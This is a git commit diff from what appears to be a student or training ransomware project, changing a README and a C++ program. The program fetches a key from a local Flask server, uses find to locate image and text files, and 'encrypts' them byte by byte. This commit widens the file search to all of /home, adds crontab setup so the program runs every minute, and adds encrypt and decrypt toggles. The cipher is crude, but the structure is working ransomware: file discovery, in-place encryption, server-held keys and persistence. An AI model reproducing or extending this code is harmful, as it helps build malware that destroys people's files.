5878f78279119277d6b711dda6b47ffa1806b4df
Chris Dixon <chris_dixon1989@hotmail.com>
2021-08-16 03:12:37 -0700

    updated linux find

--- README.md
+++ README.md
@@ -10,14 +10,12 @@ source .venv/bin/activate
 pip3 install -r requirements.txt
 export FLASK_APP=ransom_api.py
 export FLASK_ENV=development
+flask run
 
 Run Script to build project and periodically run via crontab: 
 1. sudo apt-get install nlohmann-json3-dev
-2. g++ -std=c++11 -I/usr/local/include ransomProject.cpp -o ransomProject
+2. g++ -std=c++11 ransomProject.cpp ransomFunctions.cpp -o ransomProject
 3. echo "* * * * * cd /home/chronks/Desktop/IRProject && ./ransomProject" | crontab -
-
-
-
 
 Docs:
 https://json.nlohmann.me/api/basic_json/parse/
--- ransomProject.cpp
+++ ransomProject.cpp
@@ -13,14 +13,16 @@ int main(){
 	std::string secretKey = get_request("http://127.0.0.1:5000/secretKey");	
     std::vector<std::string> locationsToBeEncrypted;  
 
-	system("find . -type f \\( -name \"*.jpeg\" -o -name \"catPoetr*.txt\" \\) > fileLocations"); // Run script to find files and put them into a word document. TODO 
+	system("find /home -type f \\( -name \"*.jpeg\" -o -name \"catPoetr*.txt\" \\) > fileLocations"); // Run script to find files and put them into a word document. TODO 
 	bool success = getFileContents("fileLocations", fileLocationsVector); // Reads found file locations into string vector.	
 	std::vector<std::string> serverLocationsVector = jsonToStringVector(j_complete); // Puts server locations into a string vector.		
 	locationsMinusServerLocations(locationsToBeEncrypted, fileLocationsVector, serverLocationsVector); // Removes locations already stored on server.  
     
+    bool encrypt = false; 
+    bool decrypt = true;
 	
 	//ENCRYPT
-    if(locationsToBeEncrypted.size() > 0 && false){
+    if(locationsToBeEncrypted.size() > 0 & encrypt){
     	std::vector<std::vector<std::string>> fileContentVector = fileContentRetreiver(locationsToBeEncrypted); // Puts contents of files into a vector<vector<string>>
 	 	// ENCRYPT - Basic encryption. Just increments by one. Will change for asymmetric encryption.
 		for(auto& file: fileContentVector){
@@ -35,9 +37,8 @@ int main(){
 		encryptOrDecryptFile(fileContentVector, fileLocationsVector);	
     }
 
-
     //DECRYPT
-    if(false){
+    if(decrypt){
     	std::vector<std::vector<std::string>> fileContentVector2 = fileContentRetreiver(serverLocationsVector); // Puts contents of files into a vector<vector<string>>
 	    // DECRYPT - Basic encryption. Just decrements by one. Will change for asymmetric decryption.
 		for(auto& file: fileContentVector2){
